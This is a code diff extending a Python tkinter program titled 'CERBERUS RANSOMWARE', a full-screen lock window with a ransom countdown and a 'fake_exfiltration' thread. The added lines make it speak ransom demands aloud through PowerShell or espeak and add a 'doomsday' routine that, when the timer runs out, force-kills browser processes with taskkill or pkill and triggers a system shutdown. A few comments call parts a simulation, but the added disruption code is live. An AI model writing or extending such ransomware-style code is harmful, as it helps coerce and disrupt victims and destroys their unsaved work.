@@ -6,6 +6,8 @@ import json
 import threading
 import time
 import socket
+import shutil
+import subprocess
 from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage
 from tkinter import font as tkfont
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -204,6 +206,7 @@ class RansomwareGUI:
     def __init__(self, master, victim_id):
         self.master = master
         self.victim_id = victim_id
+        self.doomsday_triggered = False
 
         # Kiosk Mode Settings (Linux Optimized)
         master.title("CERBERUS RANSOMWARE")
@@ -290,8 +293,9 @@ class RansomwareGUI:
         threading.Thread(target=self.update_timer, daemon=True).start()
         threading.Thread(target=self.fake_exfiltration, daemon=True).start()
         
-        # Attempt Wallpaper Change (Best Effort)
-        self.master.after(1000, self.change_wallpaper)
+        # Attempt Wallpaper & Voice
+        self.master.after(2000, self.change_wallpaper)
+        self.master.after(3000, lambda: self.speak_message("Your files are encrypted. Payment is required."))
 
     def force_focus_loop(self):
         """Aggressively keeps window on top."""
@@ -311,16 +315,54 @@ class RansomwareGUI:
     def disable_event(self):
         pass
 
+    def speak_message(self, message):
+        """Cross-platform TTS."""
+        def _speak():
+            try:
+                if os.name == 'nt':
+                    # Windows PowerShell TTS
+                    cmd = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{message}')"
+                    subprocess.run(["powershell", "-Command", cmd], creationflags=subprocess.CREATE_NO_WINDOW)
+                else:
+                    # Linux espeak or spd-say
+                    if shutil.which("espeak"):
+                         subprocess.run(["espeak", message], stderr=subprocess.DEVNULL)
+                    elif shutil.which("spd-say"):
+                         subprocess.run(["spd-say", message], stderr=subprocess.DEVNULL)
+            except:
+                pass
+        threading.Thread(target=_speak, daemon=True).start()
+
     def change_wallpaper(self):
-        # Very red background for Linux GNOME/Mate/Kali
+        # Placeholder for strict simulation
+        pass
+
+    def trigger_doomsday(self):
+        """Kills browsers and initiates shutdown."""
+        if self.doomsday_triggered: return
+        self.doomsday_triggered = True
+        
+        self.speak_message("Time has expired. System failure imminent.")
+        self.master.configure(bg='#ff0000') # RED ALERT
+        
+        # 1. Kill Browsers (Close tabs)
+        browsers = ["chrome", "firefox", "msedge", "brave", "opera", "vivaldi"]
         try:
-            # Check for gsettings
-            if os.system("which gsettings > /dev/null") == 0:
-                 # Try to set a solid red color (or similar, widely supported URIs can be tricky without a file)
-                 # For now, let's just try to set it to 'none' and bgColor to red if possible, 
-                 # or just leave it. A solid color image generation is safer but requires PIL.
-                 # SAFE SIMULATION: Just print to log
-                 pass
+            if os.name == 'nt':
+                for b in browsers:
+                    os.system(f"taskkill /F /IM {b}.exe >nul 2>&1")
+            else:
+                for b in browsers:
+                    os.system(f"pkill -f {b} >/dev/null 2>&1")
+        except:
+            pass
+            
+        # 2. Shutdown
+        try:
+            if os.name == 'nt':
+                os.system("shutdown /s /t 15 /c \"CERBERUS: TIME EXPIRED\"")
+            else:
+                os.system("shutdown -h +1 \"CERBERUS: TIME EXPIRED\"") 
         except:
             pass
 
@@ -328,6 +370,12 @@ class RansomwareGUI:
         while self.heartbeat_thread_running and self.time_left > 0:
             time.sleep(1)
             self.time_left -= 1
+            
+            # Check for Doomsday
+            if self.time_left <= 0:
+                self.master.after(0, self.trigger_doomsday)
+                self.timer_label.config(text="00:00:00")
+                break
             
             # Format
             m, s = divmod(self.time_left, 60)
@@ -337,7 +385,7 @@ class RansomwareGUI:
             try:
                 self.timer_label.config(text=time_str)
                 if self.time_left < 3600: # Last hour panic
-                    self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff') # Blink
+                    self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff')
             except:
                 pass
 
